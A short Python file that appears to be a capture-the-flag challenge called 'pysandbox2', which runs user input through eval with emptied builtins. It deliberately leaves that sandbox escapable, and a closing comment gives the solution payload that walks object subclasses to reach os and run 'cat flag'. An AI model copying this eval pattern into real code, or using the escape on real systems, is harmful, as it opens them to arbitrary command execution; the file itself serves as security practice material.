from __future__ import print_function
print('''pysandbox2: easy
how about eval in empty dict? Python2.7 ./flag''')

try:
    input = raw_input
except:
    pass
c = input()
x=globals
_eval = eval

print(_eval(c, {'__builtins__':{}}, {}))
# ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os'].popen("cat flag").read()
